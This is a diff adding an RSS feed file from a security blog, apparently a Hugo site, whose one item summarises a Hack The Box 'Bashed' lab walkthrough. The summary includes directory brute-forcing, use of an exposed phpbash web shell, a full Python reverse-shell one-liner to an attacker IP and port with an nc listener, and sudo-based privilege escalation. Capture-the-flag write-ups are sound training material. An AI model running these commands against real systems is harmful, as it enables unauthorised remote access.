@@ -1,0 +1,25 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>sudo on xf3n9 secwalk</title>
+    <link>https://xf3n9.github.io/tags/sudo/</link>
+    <description>Recent content in sudo on xf3n9 secwalk</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <lastBuildDate>Sun, 02 Apr 2023 00:00:00 +0000</lastBuildDate><atom:link href="https://xf3n9.github.io/tags/sudo/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Bashed</title>
+      <link>https://xf3n9.github.io/docs/hackthebox/bashed/</link>
+      <pubDate>Sun, 02 Apr 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://xf3n9.github.io/docs/hackthebox/bashed/</guid>
+      <description>HTB: Bashed#Recon#http://10.10.10.68 有一篇关于phpbash的文章
+gobuster -u http://10.10.10.68 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt /dev页面：
+点击phpbash.php给出一个页面shell，即phpbash
+Phpbash#尝试进入/home目录下的用户目录，成功找到user.txt
+Shell Upgrade#在phpbash中准备：
+python -c &amp;#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;#34;10.10.14.157&amp;#34;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;#34;/bin/sh&amp;#34;,&amp;#34;-i&amp;#34;]);&amp;#39; 在kali中监听：
+nc -nvlp 4444# connect to local from remotepython -c &amp;#39;import pty;pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39;# pty shell PrivEsc#sudo -lUser www-data may run the following commands on bashed:(scriptmanager : scriptmanager) NOPASSWD: ALL# switch user to scriptmanagersudo -u scriptmanager /bin/bashls -l /scripts# autorun py gen txttest.</description>
+    </item>
+    
+  </channel>
+</rss>
